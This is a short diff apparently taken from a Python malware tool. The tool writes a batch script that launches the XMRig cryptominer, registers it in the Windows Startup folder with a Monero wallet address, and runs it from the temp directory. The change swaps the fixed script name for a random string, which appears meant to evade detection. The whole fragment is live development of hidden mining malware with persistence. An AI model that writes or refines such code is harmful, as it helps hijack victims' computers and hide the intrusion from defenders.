@@ -2588,7 +2588,8 @@ call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startu
 exit
 """.format(cc.get_xmr_adress(), get_random_string(12))
 
-    batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")
+    tm = get_random_string(12)
+    batch_filepath = os.path.join(os.environ["TEMP"], tm)
 
     with open(batch_filepath, "w") as f:
         f.write(batch_code)
